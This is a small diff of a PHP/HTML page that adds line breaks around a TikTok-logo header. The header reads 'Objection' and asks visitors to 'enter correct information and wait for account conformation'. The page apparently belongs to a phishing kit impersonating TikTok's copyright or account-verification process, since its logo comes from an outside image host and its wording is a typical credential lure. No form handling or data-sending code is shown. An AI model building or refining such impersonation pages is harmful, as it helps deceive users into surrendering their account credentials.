@@ -89,7 +89,7 @@ echo '';
   </table>
   <div id="arkaplan">
 
-  <br><br><br><br><br>
+  <br><br><br><br><br><br>
 
 <center>
   <div class="copyright_div" id="copyright_div">
@@ -271,8 +271,8 @@ echo '';
 </style>
 <center>
 <div id="erhancanturker" class="erhancanturker">
-<br>
-<img  alt="tiktok" src="https://i.hizliresim.com/jqZypj.png" width="80" style="border-radius:50%;">
+<br><br><br>
+<img  alt="tiktok" src="https://i.hizliresim.com/jqZypj.png" width="80" style="border-radius:50%;"><br>
 <br>
 <h1 class="yazi">Objection</h1><br>
 <p class="yazi-2">Please enter  correct information and wait for  account conformation.please fill the form </p><br>
